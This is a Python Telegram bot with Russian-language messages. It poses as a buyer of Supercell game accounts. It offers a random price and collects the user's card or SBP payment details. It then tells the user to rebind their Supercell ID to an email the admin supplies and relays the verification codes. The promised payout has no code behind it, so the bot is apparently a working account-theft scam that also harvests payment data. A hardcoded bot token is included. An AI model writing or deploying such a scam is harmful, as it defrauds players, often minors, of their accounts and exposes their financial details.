import asyncio
import logging
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import aiosqlite

TOKEN = "8673948593:AAGr2QXNGPTYdJWJBNJFE6KfB-ZwQIaTWP8"
ADMIN_ID = 8266829782

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

DB_NAME = "bot.db"

GAMES = {"cr": "Clash Royale", "bs": "Brawl Stars", "coc": "Clash of Clans"}

class SellStates(StatesGroup):
    waiting_tag = State()
    waiting_payment = State()
    waiting_email = State()      # ожидание почты от админа
    waiting_code = State()       # ожидание кода от админа

async def init_db():
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS sales 
            (id INTEGER PRIMARY KEY, user_id INTEGER, username TEXT, game TEXT, 
             tag TEXT, price INTEGER, payment TEXT, email TEXT, code TEXT, status TEXT)''')
        await db.commit()

def game_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Clash Royale", callback_data="game_cr")],
        [InlineKeyboardButton(text="Brawl Stars", callback_data="game_bs")],
        [InlineKeyboardButton(text="Clash of Clans", callback_data="game_coc")]
    ])

@dp.message(Command("start"))
async def start(msg: types.Message, state: FSMContext):
    await state.clear()
    await msg.answer(
        "✨ **Добро пожаловать в крупнейшего бота по скупке аккаунтов Supercell!**\n\n"
        "🎉 Быстрые выплаты • Полная защита\n\n"
        "💎 Аккаунт какой игры хочешь продать?",
        reply_markup=game_kb(),
        parse_mode="Markdown"
    )

@dp.callback_query(F.data.startswith("game_"))
async def choose_game(clb: types.CallbackQuery, state: FSMContext):
    game_key = clb.data.split("_")[1]
    game_name = GAMES[game_key]
    await state.update_data(game=game_key, game_name=game_name)
    await clb.message.edit_text(f"🧿 Укажите тег аккаунта **{game_name}**:", parse_mode="Markdown")
    await state.set_state(SellStates.waiting_tag)

@dp.message(SellStates.waiting_tag)
async def process_tag(msg: types.Message, state: FSMContext):
    tag = msg.text.strip().replace("#", "").upper()
    data = await state.get_data()
    price = random.randint(1400, 5200)
    
    await state.update_data(tag=tag, price=price)
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Продать за {price}₽", callback_data=f"sell_{price}")],
        [InlineKeyboardButton(text="Отмена", callback_data="cancel")]
    ])
    
    await msg.answer(f"🔍 **{data['game_name']}** — тег `{tag}`\n\nМы готовы выкупить за **{price} ₽**", 
                     reply_markup=kb, parse_mode="Markdown")

@dp.callback_query(F.data.startswith("sell_"))
async def start_sell(clb: types.CallbackQuery, state: FSMContext):
    await clb.message.edit_text(
        "🔖 **Отправьте ваши платежные реквизиты**\n\nПример:\nVisa – 1234 5678 9012 3456\nСБП – +77777777777",
        parse_mode="Markdown"
    )
    await state.set_state(SellStates.waiting_payment)

@dp.message(SellStates.waiting_payment)
async def save_payment(msg: types.Message, state: FSMContext):
    payment = msg.text.strip()
    data = await state.get_data()
    
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute(
            "INSERT INTO sales (user_id, username, game, tag, price, payment, status) VALUES (?, ?, ?, ?, ?, ?, 'waiting_email')",
            (msg.from_user.id, msg.from_user.username, data['game_name'], data['tag'], data['price'], payment)
        )
        await db.commit()
    
    await msg.answer("✅ Реквизиты сохранены!")
    
    # Главное сообщение с инструкцией
    await msg.answer(
        "🙂 **Уважаемый клиент!**\n\n"
        "Я выступаю в роли вашего персонального менеджера.\n\n"
        "1. Войдите в игру и перейдите в раздел «Supercell ID».\n"
        "2. Нажмите кнопку «Сменить почту».\n"
        "3. Введите в игре код, полученный на вашу электронную почту.\n"
        "4. Введите новый адрес электронной почты (для генерации нажмите кнопку ниже).\n"
        "5. Система запросит код с новой почты — нажмите «Получить код».\n\n"
        "⚡️ После успешной перепривязки нажмите кнопку «Аккаунт перепривязан».",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔑 Генерировать почту", callback_data="need_email")],
            [InlineKeyboardButton(text="Аккаунт перепривязан ✅", callback_data="account_done")]
        ]),
        parse_mode="Markdown"
    )

# ==================== РУЧНОЙ РЕЖИМ ====================

@dp.callback_query(F.data == "need_email")
async def need_email(clb: types.CallbackQuery, state: FSMContext):
    user_id = clb.from_user.id
    await bot.send_message(ADMIN_ID, 
        f"🔔 **Нужна почта!**\n\n"
        f"Пользователь: @{clb.from_user.username} (ID: {user_id})\n"
        f"Нажми /send_email {user_id} твоя_почта@пример.com"
    )
    await clb.answer("Запрос отправлен админу. Ожидайте...", show_alert=True)

@dp.message(Command("send_email"))
async def send_email_to_user(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        _, user_id, email = msg.text.split(maxsplit=2)
        user_id = int(user_id)
        
        await bot.send_message(user_id,
            f"📧 **Электронная почта для привязки:**\n\n"
            f"`{email}`\n\n"
            "Скопируйте и вставьте в игру.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔍 Получить код", callback_data=f"need_code_{user_id}")]
            ]),
            parse_mode="Markdown"
        )
        await msg.answer(f"✅ Почта отправлена пользователю {user_id}")
    except:
        await msg.answer("Формат: /send_email USER_ID почта@пример.com")

@dp.callback_query(F.data.startswith("need_code_"))
async def need_code(clb: types.CallbackQuery):
    user_id = int(clb.data.split("_")[2])
    await bot.send_message(ADMIN_ID,
        f"🔑 **Пользователь {user_id} просит код!**\n\n"
        f"Напиши: /send_code {user_id} 123456"
    )
    await clb.answer("Запрос на код отправлен админу", show_alert=True)

@dp.message(Command("send_code"))
async def send_code_to_user(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        _, user_id, code = msg.text.split(maxsplit=2)
        user_id = int(user_id)
        await bot.send_message(user_id, f"✅ **Код для привязки:**\n\n`{code}`\n\nВставьте в игру.")
        await msg.answer(f"✅ Код отправлен пользователю {user_id}")
    except:
        await msg.answer("Формат: /send_code USER_ID КОД")

@dp.callback_query(F.data == "account_done")
async def account_done(clb: types.CallbackQuery):
    await clb.message.edit_text("✅ Аккаунт принят в обработку!\n💵 Выплата будет произведена в течение 5–15 минут.")

@dp.callback_query(F.data == "cancel")
async def cancel(clb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await clb.message.edit_text("❌ Операция отменена.")

async def main():
    await init_db()
    print("🤖 Бот запущен в ручном режиме!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
